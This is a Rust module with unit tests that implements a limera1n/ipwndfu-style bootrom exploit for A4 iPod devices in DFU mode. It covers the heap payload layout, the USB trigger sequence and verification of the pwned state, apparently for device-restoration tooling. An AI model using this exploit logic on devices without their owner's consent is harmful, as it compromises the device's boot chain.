//! A4 entry matching the compact ipwndfu payload layout and the reset /
//! re-enumeration sequence used by Legacy iOS Kit's macOS ipwnder_lite path.
//! Called only by an authorized preparation step, never during discovery.
use crate::application::preparation::PreparationError;
use legacy_ios_core::{DeviceMode, Ecid};
use legacy_ios_transport::{
    ControlTransferOutcome, ExploitControlRequest, IbootClient, RecoveryError, parse_iboot_serial,
};
use nusb::transfer::{ControlType, Recipient, TransferError};
use std::{future::Future, time::Duration};
use tokio::time::{Instant, sleep};

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum UsbFailure {
    Interrupted,
    Stalled,
    Disconnected,
    Access,
    UnexpectedReply,
    ReconnectTimeout,
    NotPwned,
    Transport,
}
impl UsbFailure {
    fn code(self) -> &'static str {
        match self {
            Self::Interrupted => "timeoutOrCancelled",
            Self::Stalled => "stalled",
            Self::Disconnected => "disconnected",
            Self::Access => "access",
            Self::UnexpectedReply => "unexpectedReply",
            Self::ReconnectTimeout => "reconnectTimeout",
            Self::NotPwned => "notPwned",
            Self::Transport => "transport",
        }
    }
}
fn transfer_error(error: RecoveryError) -> UsbFailure {
    match error {
        RecoveryError::Transfer(TransferError::Cancelled) | RecoveryError::TransferTimeout => {
            UsbFailure::Interrupted
        }
        RecoveryError::Transfer(TransferError::Stall) => UsbFailure::Stalled,
        RecoveryError::NoDevice | RecoveryError::Transfer(TransferError::Disconnected) => {
            UsbFailure::Disconnected
        }
        RecoveryError::Usb(error) if error.kind() == nusb::ErrorKind::Disconnected => {
            UsbFailure::Disconnected
        }
        RecoveryError::Usb(_) => UsbFailure::Access,
        _ => UsbFailure::Transport,
    }
}
fn fail(stage: &'static str, reason: UsbFailure) -> PreparationError {
    PreparationError::Exploit {
        stage,
        reason: reason.code(),
    }
}

/// The actual replaceable USB boundary; tests exercise a reference transcript.
trait DfuIo: Send {
    fn reconnect(&mut self, pwned: bool) -> impl Future<Output = Result<(), UsbFailure>> + Send;
    fn send(
        &mut self,
        request: u8,
        data: &[u8],
        millis: u64,
    ) -> impl Future<Output = Result<ControlTransferOutcome, UsbFailure>> + Send;
    fn receive(
        &mut self,
        request: u8,
        length: u16,
        millis: u64,
    ) -> impl Future<Output = Result<(ControlTransferOutcome, Vec<u8>), UsbFailure>> + Send;
}
struct Usb {
    client: Option<IbootClient>,
    ecid: Ecid,
}
impl DfuIo for Usb {
    async fn reconnect(&mut self, pwned: bool) -> Result<(), UsbFailure> {
        let client = self.client.take().ok_or(UsbFailure::Disconnected)?;
        // IbootClient::reset in the pinned dependency retains its interface.
        // nusb refuses to reset any device with a claimed interface. Release
        // the client first, then reset a fresh, unclaimed device handle.
        drop(client);
        reset_unclaimed(self.ecid).await?;
        sleep(Duration::from_secs(1)).await;
        self.wait_for_device(pwned).await
    }
    async fn send(
        &mut self,
        request: u8,
        data: &[u8],
        millis: u64,
    ) -> Result<ControlTransferOutcome, UsbFailure> {
        self.client
            .as_ref()
            .ok_or(UsbFailure::Disconnected)?
            .exploit_control_out_observe(
                ExploitControlRequest::new(ControlType::Class, Recipient::Interface, request),
                data,
                Duration::from_millis(millis),
            )
            .await
            .map_err(transfer_error)
    }
    async fn receive(
        &mut self,
        request: u8,
        length: u16,
        millis: u64,
    ) -> Result<(ControlTransferOutcome, Vec<u8>), UsbFailure> {
        self.client
            .as_ref()
            .ok_or(UsbFailure::Disconnected)?
            .exploit_control_in_observe(
                ExploitControlRequest::new(ControlType::Class, Recipient::Interface, request),
                length,
                Duration::from_millis(millis),
            )
            .await
            .map_err(transfer_error)
    }
}

async fn reset_unclaimed(ecid: Ecid) -> Result<(), UsbFailure> {
    let mut candidates = nusb::list_devices()
        .await
        .map_err(|_| UsbFailure::Access)?
        .filter(|device| {
            let info = parse_iboot_serial(device.serial_number().unwrap_or_default());
            device.vendor_id() == 0x05ac
                && device.product_id() == 0x1227
                && info.ecid() == Some(ecid)
                && super::is_ipod4_bootrom(&info)
        });
    let info = candidates.next().ok_or(UsbFailure::Disconnected)?;
    if candidates.next().is_some() {
        return Err(UsbFailure::UnexpectedReply);
    }
    let device = info.open().await.map_err(|_| UsbFailure::Access)?;
    // A successful re-enumeration can disconnect the old handle before
    // its completion is delivered. Other reset failures must be reported.
    if let Err(error) = device.reset().await
        && error.kind() != nusb::ErrorKind::Disconnected
    {
        return Err(UsbFailure::Access);
    }
    Ok(())
}

impl Usb {
    async fn wait_for_device(&mut self, pwned: bool) -> Result<(), UsbFailure> {
        let deadline = Instant::now() + Duration::from_secs(10);
        let mut saw_unpwned = false;
        loop {
            match IbootClient::open(Some(self.ecid)).await {
                Ok(client) => {
                    let info = client.device_info();
                    if client.mode() != DeviceMode::Dfu
                        || info.ecid() != Some(self.ecid)
                        || !super::is_ipod4_bootrom(info)
                        || info.srtg() != Some("iBoot-574.4")
                    {
                        return Err(UsbFailure::UnexpectedReply);
                    }
                    if !pwned || info.pwned().is_some() {
                        self.client = Some(client);
                        return Ok(());
                    }
                    saw_unpwned = true;
                }
                Err(RecoveryError::NoDevice) => {}
                Err(error) => return Err(transfer_error(error)),
            }
            if Instant::now() >= deadline {
                return Err(if saw_unpwned {
                    UsbFailure::NotPwned
                } else {
                    UsbFailure::ReconnectTimeout
                });
            }
            sleep(Duration::from_millis(200)).await;
        }
    }
}

pub(super) fn open_failure(error: RecoveryError) -> PreparationError {
    fail("prepareDevice", transfer_error(error))
}

pub(super) async fn exploit(
    client: IbootClient,
    ecid: Ecid,
    shellcode: &[u8],
) -> Result<(), PreparationError> {
    let payload = payload(shellcode)?;
    run(
        &mut Usb {
            client: Some(client),
            ecid,
        },
        &payload,
    )
    .await
}

fn payload(shellcode: &[u8]) -> Result<Vec<u8>, PreparationError> {
    if shellcode.is_empty() || shellcode.len() > 1024 {
        return Err(fail("payload", UsbFailure::UnexpectedReply));
    }
    // axi0mX/ipwndfu: sixteen 64-byte headers precede the relocated shellcode.
    // The old large heap-spray path places it at a different address.
    let mut payload = vec![0xcc; 1024];
    for block in payload.chunks_exact_mut(64) {
        for (index, word) in [0x405_u32, 0x101, 0x84000401, 0x8403bf9c]
            .into_iter()
            .enumerate()
        {
            block[index * 4..index * 4 + 4].copy_from_slice(&word.to_le_bytes());
        }
    }
    payload.extend_from_slice(shellcode);
    Ok(payload)
}

async fn required_send(
    io: &mut impl DfuIo,
    stage: &'static str,
    data: &[u8],
    millis: u64,
) -> Result<(), PreparationError> {
    match io
        .send(1, data, millis)
        .await
        .map_err(|reason| fail(stage, reason))?
    {
        ControlTransferOutcome::Ok => Ok(()),
        ControlTransferOutcome::Stall => Err(fail(stage, UsbFailure::Stalled)),
        // The transport maps both cancelled requests and IOKit transaction
        // timeouts to this outcome; do not claim a more precise cause.
        ControlTransferOutcome::TimedOut => Err(fail(stage, UsbFailure::Interrupted)),
    }
}

async fn run(io: &mut impl DfuIo, payload: &[u8]) -> Result<(), PreparationError> {
    io.reconnect(false)
        .await
        .map_err(|reason| fail("prepareDevice", reason))?;
    required_send(io, "sendPayload", payload, 1000).await?;
    let (outcome, reply) = io
        .receive(1, 1, 100)
        .await
        .map_err(|reason| fail("primeRead", reason))?;
    if outcome != ControlTransferOutcome::Ok {
        return Err(fail(
            "primeRead",
            match outcome {
                ControlTransferOutcome::TimedOut => UsbFailure::Interrupted,
                _ => UsbFailure::Stalled,
            },
        ));
    }
    if reply.len() != 1 {
        return Err(fail("primeRead", UsbFailure::UnexpectedReply));
    }
    // These two transfers deliberately exercise abort/timeout behavior. Their
    // observed outcome is not proof of success; the final PWND check is.
    io.send(1, &[0; 2048], 10)
        .await
        .map_err(|reason| fail("abortTransfer", reason))?;
    io.send(2, &[], 100)
        .await
        .map_err(|reason| fail("trigger", reason))?;
    io.reconnect(false)
        .await
        .map_err(|reason| fail("reconnect", reason))?;
    io.send(1, &[], 100)
        .await
        .map_err(|reason| fail("finalize", reason))?;
    for _ in 0..3 {
        io.receive(3, 6, 100)
            .await
            .map_err(|reason| fail("finalize", reason))?;
    }
    io.reconnect(true)
        .await
        .map_err(|reason| fail("verifyPwned", reason))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[derive(Debug, PartialEq, Eq)]
    enum Call {
        Reset(bool),
        Send(u8, usize, u64),
        Receive(u8, u16, u64),
    }
    struct Transcript {
        calls: Vec<Call>,
        fail_call: Option<usize>,
        final_pwned: bool,
    }
    impl DfuIo for Transcript {
        async fn reconnect(&mut self, pwned: bool) -> Result<(), UsbFailure> {
            self.calls.push(Call::Reset(pwned));
            if pwned && !self.final_pwned {
                return Err(UsbFailure::NotPwned);
            }
            Ok(())
        }
        async fn send(
            &mut self,
            request: u8,
            data: &[u8],
            millis: u64,
        ) -> Result<ControlTransferOutcome, UsbFailure> {
            self.calls.push(Call::Send(request, data.len(), millis));
            if self.fail_call == Some(self.calls.len()) {
                return Ok(ControlTransferOutcome::TimedOut);
            }
            // The intentional interrupt/trigger/finalization transfers may
            // time out. Success still requires the final reconnect evidence.
            Ok(if millis <= 100 {
                ControlTransferOutcome::TimedOut
            } else {
                ControlTransferOutcome::Ok
            })
        }
        async fn receive(
            &mut self,
            request: u8,
            length: u16,
            millis: u64,
        ) -> Result<(ControlTransferOutcome, Vec<u8>), UsbFailure> {
            self.calls.push(Call::Receive(request, length, millis));
            if self.fail_call == Some(self.calls.len()) {
                return Ok((ControlTransferOutcome::TimedOut, vec![]));
            }
            if request == 3 {
                return Ok((ControlTransferOutcome::TimedOut, vec![]));
            }
            Ok((ControlTransferOutcome::Ok, vec![0; length as usize]))
        }
    }
    fn transcript() -> Transcript {
        Transcript {
            calls: vec![],
            fail_call: None,
            final_pwned: true,
        }
    }

    #[test]
    fn payload_uses_the_compact_a4_layout_expected_by_the_shellcode() {
        let shellcode = vec![0xaa; 368];
        let encoded = payload(&shellcode).unwrap();
        assert_eq!(encoded.len(), 1392);
        assert_eq!(&encoded[1024..], &shellcode);
        for header in encoded[..1024].chunks_exact(64) {
            assert_eq!(
                &header[..16],
                &[
                    0x05, 0x04, 0, 0, 0x01, 0x01, 0, 0, 0x01, 0x04, 0, 0x84, 0x9c, 0xbf, 0x03, 0x84
                ]
            );
        }
        assert!(payload(&[]).is_err());
        assert!(payload(&vec![0; 1025]).is_err());
    }

    #[tokio::test]
    async fn sends_the_reference_reset_and_compact_transfer_transcript() {
        let mut io = transcript();
        run(&mut io, &payload(&[0xaa; 368]).unwrap()).await.unwrap();
        assert_eq!(
            io.calls,
            vec![
                Call::Reset(false),
                Call::Send(1, 1392, 1000),
                Call::Receive(1, 1, 100),
                Call::Send(1, 2048, 10),
                Call::Send(2, 0, 100),
                Call::Reset(false),
                Call::Send(1, 0, 100),
                Call::Receive(3, 6, 100),
                Call::Receive(3, 6, 100),
                Call::Receive(3, 6, 100),
                Call::Reset(true),
            ]
        );
    }

    #[tokio::test]
    async fn a_payload_timeout_stops_before_triggering_the_exploit_and_preserves_the_stage() {
        let mut io = transcript();
        io.fail_call = Some(2);
        assert_eq!(
            run(&mut io, &[0; 1392]).await,
            Err(PreparationError::Exploit {
                stage: "sendPayload",
                reason: "timeoutOrCancelled"
            })
        );
        assert_eq!(io.calls.len(), 2);
    }

    #[tokio::test]
    async fn a_failed_one_byte_read_is_distinct_from_finalization_timeouts() {
        let mut io = transcript();
        io.fail_call = Some(3);
        assert_eq!(
            run(&mut io, &[0; 1392]).await,
            Err(PreparationError::Exploit {
                stage: "primeRead",
                reason: "timeoutOrCancelled"
            })
        );
        assert_eq!(io.calls.len(), 3);
    }

    #[tokio::test]
    async fn sending_requests_is_not_success_without_pwned_evidence() {
        let mut io = transcript();
        io.final_pwned = false;
        assert_eq!(
            run(&mut io, &[0; 1392]).await,
            Err(PreparationError::Exploit {
                stage: "verifyPwned",
                reason: "notPwned"
            })
        );
    }
}
